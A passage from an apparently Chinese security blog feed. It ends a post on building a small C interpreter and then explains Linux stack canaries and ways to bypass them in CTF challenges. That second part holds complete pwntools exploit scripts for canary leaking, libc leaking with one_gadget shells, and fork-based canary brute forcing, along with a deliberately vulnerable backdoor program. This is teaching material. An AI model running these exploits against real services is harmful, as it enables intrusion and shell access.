class="params">(<span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">program</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    next();                  <span class="comment">// get next token</span></span><br><span class="line">    <span class="keyword">while</span> (token &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"token is: %c\n"</span>, token);</span><br><span class="line">        next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">eval</span><span class="params">()</span> </span>&#123; <span class="comment">// do nothing yet</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, fd;</span><br><span class="line"></span><br><span class="line">    argc--;</span><br><span class="line">    argv++;</span><br><span class="line"></span><br><span class="line">    poolsize = <span class="number">256</span> * <span class="number">1024</span>; <span class="comment">// arbitrary size</span></span><br><span class="line">    <span class="built_in">line</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = <span class="built_in">open</span>(*argv, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not open(%s)\n"</span>, *argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(src = old_src = <span class="built_in">malloc</span>(poolsize))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not malloc(%d) for source area\n"</span>, poolsize);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the source file</span></span><br><span class="line">    <span class="keyword">if</span> ((i = <span class="built_in">read</span>(fd, src, poolsize<span class="number">-1</span>)) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"read() returned %d\n"</span>, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    src[i] = <span class="number">0</span>; <span class="comment">// add EOF character</span></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    program();</span><br><span class="line">    <span class="keyword">return</span> eval();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li><code>next()</code> 用于词法分析，获取下一个标记，它将自动忽略空白字符。</li><li><code>program()</code> 语法分析的入口，分析整个 C 语言程序。</li><li><code>expression(level)</code> 用于解析一个表达式。</li><li><code>eval()</code> 虚拟机的入口，用于解释目标代码。</li></ol></blockquote><p>上面代码主要是逐字读取，并输出，接下来我们具体实现每个函数功能。</p><h1 id="0x02-虚拟机"><a href="#0x02-虚拟机" class="headerlink" title="0x02 虚拟机"></a>0x02 虚拟机</h1><p>在计算机中，我们主要关心，内存，CPU，寄存器。</p><p>代码（汇编指令）以二进制的形式保存在内存中；CPU 从中一条条地加载指令执行；程序运行的状态保存在寄存器中。</p><h2 id="1-内存"><a href="#1-内存" class="headerlink" title="1. 内存"></a>1. 内存</h2><p>内存用于存储数据，这里的数据可以是代码，也可以是其它的数据。</p><p>32 位的机器中，我们可以使用的内存地址为 <code>2^32 = 4G</code></p><p>内存中有几个段，在前面程序员自我修养中已经讲过了</p><ol><li>代码段（text）用于存放代码（指令）。</li><li>数据段（data）用于存放初始化了的数据，如<code>int i = 10;</code>，就需要存放到数据段中。</li><li>未初始化数据段（bss）用于存放未初始化的数据，如 <code>int i[1000];</code>，因为不关心其中的真正数值，所以单独存放可以节省空间，减少程序的体积。</li><li>栈（stack）用于处理函数调用相关的数据，如调用帧（calling frame）或是函数的局部变量等。</li><li>堆（heap）用于为程序动态分配内存。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;d当有了这个文件夹，我才有动力把它更完。&lt;/p&gt;
&lt;h1 id=&quot;0x01-设计&quot;&gt;&lt;a href=&quot;#0x01-设计&quot; class=&quot;headerlink&quot; title=&quot;0x01 设计&quot;&gt;&lt;/a&gt;0x01 设计&lt;/h1&gt;&lt;h2 id=&quot;1-构建流程&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="Bin" scheme="https://pz1o.top/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>Linux安全机制</title>
    <link href="https://pz1o.top/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    <id>https://pz1o.top/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</id>
    <published>2021-02-19T08:21:57.000Z</published>
    <updated>2021-03-03T07:24:12.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Canary"><a href="#0x01-Canary" class="headerlink" title="0x01 Canary"></a>0x01 Canary</h1><p>Canary 的意思是金丝雀,是一种用于对抗栈溢出攻击的技术，也叫做cookies。Cannry是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出时从低地址到高地址，因此想要攻击成功必须覆盖cannry。</p><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>Cannries分为三类，分别是<code>terminator</code> <code>random</code> <code>random XOR</code></p><ul><li><code>Terminator canaries</code>：由于许多栈溢出都是由于字符串操作不当造成的，也就是最后会以<code>\x00</code>结尾，其实是被截断。所以<code>Terminator canaries</code>将地位设置为<code>\x00</code>。此外还有截断字符CR(0x0d)、LF(0x0a)、EOF(0xff)</li><li><code>Random canaries</code>：这个通常在程序初始化时随机生成出来，由<code>/dev/urandom</code>生成</li><li><code>Random XOR canaries</code>：与上一个相同，但多了异或操作，相比上一个更难操作。</li></ul><p>gcc参数开启canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure><h2 id="2-演示"><a href="#2-演示" class="headerlink" title="2. 演示"></a>2. 演示</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">char buf[10];</span><br><span class="line">scanf(&quot;%s&quot;,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ gcc -fstack-protector b.c -o b</span><br></pre></td></tr></table></figure><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150601689.png" alt="image-20210220150601689"></p><p>出现错误</p><p>看汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br></pre></td></tr></table></figure><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150909813.png" alt="image-20210220150909813"></p><blockquote><p>看两处红框地方，我们可以知道是把一些东西放到rax中，之后又把rax中异或跳转。</p><p>1.fs寄存器是什么？</p><p>fs寄存器被用于存放线程局部存储(Thread Local Stroage,TLS)。TLS是为了避免多个线程同时访问同一全局变量或静态变量所导致的冲突。TLS为每一个使用全局变量的线程提供一个变量值的副本。从全局变量角度看，就是全局变量被克隆了多个副本，每一个副本都可以被一个线程独立改变。而0x28就是stack_guard</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;typedef struct</span><br><span class="line">&gt;&#123;</span><br><span class="line"> void *tcb;        &#x2F;* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                      thread descriptor used by libpthread.  *&#x2F;</span><br><span class="line"> dtv_t *dtv;</span><br><span class="line"> void *self;       &#x2F;* Pointer to the thread descriptor.  *&#x2F;</span><br><span class="line"> int multiple_threads;</span><br><span class="line"> uintptr_t sysinfo;</span><br><span class="line"> uintptr_t stack_guard;</span><br><span class="line"> ...</span><br><span class="line">&gt;&#125; tcbhead_t;</span><br></pre></td></tr></table></figure></blockquote><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.png" alt="img"></p><h2 id="3-攻击"><a href="#3-攻击" class="headerlink" title="3. 攻击"></a>3. 攻击</h2><p>攻击有两种思路</p><ol><li>第一种就是泄露canary，然后覆盖</li><li>第二种是同时篡改TLS和栈上的Canary从而绕过检查</li></ol><p>只能一次操作的通常是劫持got表，多次操作的泄露canary</p><h2 id="3-1-泄露栈中的-Canary"><a href="#3-1-泄露栈中的-Canary" class="headerlink" title="3.1 泄露栈中的 Canary"></a>3.1 泄露栈中的 Canary</h2><p>有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了</p><h3 id="1-（攻防世界）厦门邀请赛pwn1"><a href="#1-（攻防世界）厦门邀请赛pwn1" class="headerlink" title="1.（攻防世界）厦门邀请赛pwn1"></a>1.（攻防世界）厦门邀请赛pwn1</h3><p>说一下这个题的思路把</p><ol><li>利用read泄露canary</li><li>64位puts泄露基址</li><li>one_gagdet直接shell</li></ol><p>说一下我的难点</p><blockquote><p>1.第一次做这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;canary &#x3D; u64(r(7).rjust(8,&#39;\x00&#39;)) </span><br></pre></td></tr></table></figure><p>要明白是右对齐，也可以这样写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;canary &#x3D; u64(r(8))-0xa</span><br></pre></td></tr></table></figure><p>具体就是上面讲的原理</p><p>2.sl()和s()区别</p><p>sl()会多发一个’\n’</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#ontext.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.232.so"</span>)</span><br><span class="line">p = remote(<span class="string">"111.200.241.244"</span>,<span class="number">41155</span>)</span><br><span class="line"><span class="comment">#p = process("./babystack")</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400a93</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x400908</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> </span><br><span class="line">sla(<span class="string">'&gt;&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x4009DD')</span></span><br><span class="line">sla(<span class="string">'&gt;&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">ru(<span class="string">b'A'</span>*<span class="number">0x88</span>+<span class="string">'\n'</span>)</span><br><span class="line">canary = u64(r(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))  </span><br><span class="line">leak(<span class="string">"canary"</span>,canary)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b'A'</span>*<span class="number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">puts = uu64(r(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">leak(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">leak(<span class="string">'libc'</span>,libc_base)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b'A'</span>*<span class="number">8</span> + p64(one_gadget)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="3-2Fork子进程程序爆破canary"><a href="#3-2Fork子进程程序爆破canary" class="headerlink" title="3.2Fork子进程程序爆破canary"></a>3.2Fork子进程程序爆破canary</h2><h3 id="NJCTF2017（messager）"><a href="#NJCTF2017（messager）" class="headerlink" title="NJCTF2017（messager）"></a>NJCTF2017（messager）</h3><p>看一下这个题</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155807161.png" alt="image-20210221155807161"></p><p>函数主要逻辑是将flag从文件里取出，然后放到bss段，同时开通了一个socket发送flag函数send，目的就是控制这个函数</p><p>此外，这个主进程每次还会fork一个子进程，让用户与400BE9进行交互</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155843764.png" alt="image-20210221155843764"></p><p>sub_400BE9函数里有栈溢出</p><blockquote><p>Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致</p><p>通常情况下，我们爆破canary是不可能的，但由于同一个进程内复刻的子进程，它们的canaries是不变的，且子进程崩溃不会影响到主进程，这就给了我们爆破的机会</p><p>爆破是逐字节进行的，根据进程崩溃与否来判断填上去的字符串是否正确。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    canary = <span class="string">"\x00"</span></span><br><span class="line">    <span class="keyword">while</span> len(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">            p = process(<span class="string">"./messager"</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">"A"</span>*<span class="number">104</span> + canary + chr(i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p.recv()</span><br><span class="line">                canary +=chr(x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                p.close()</span><br><span class="line">    leak(<span class="string">"canary"</span>,canary)</span><br><span class="line">leak_canary()</span><br><span class="line">p = process(<span class="string">"./messager"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">s(<span class="string">"A"</span>*<span class="number">104</span>+canary+<span class="string">"A"</span>*<span class="number">8</span>+p64(<span class="number">0x400bc6</span>))</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h3 id="fork中getshell"><a href="#fork中getshell" class="headerlink" title="fork中getshell"></a>fork中getshell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, <span class="built_in">buffer</span>, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"welcome"</span>);</span><br><span class="line">vul();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"recv sucess"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">wait(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bin'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bin"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        p.send(<span class="string">'a'</span>*<span class="number">100</span> + canary + chr(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += chr(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">100</span> + canary + <span class="string">'a'</span>*<span class="number">12</span> + p32(<span class="number">0x80485FB</span>))</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">flag = p.recv()</span><br><span class="line">p.close()</span><br><span class="line">log.success(<span class="string">'flag is:'</span> + flag)</span><br></pre></td></tr></table></figure><h2 id="3-3-SSP-Stack-Smashing-Protect-Leak"><a href="#3-3-SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="3.3 SSP(Stack Smashing Protect) Leak"></a>3.3 SSP(Stack Smashing Protect) Leak</h2><p><strong>SSP leak 就是通过故意触发canary的保护来输出我们想要地址上的值。</strong></p><p>触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印<code>stack smashing detected</code></p><p>看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span 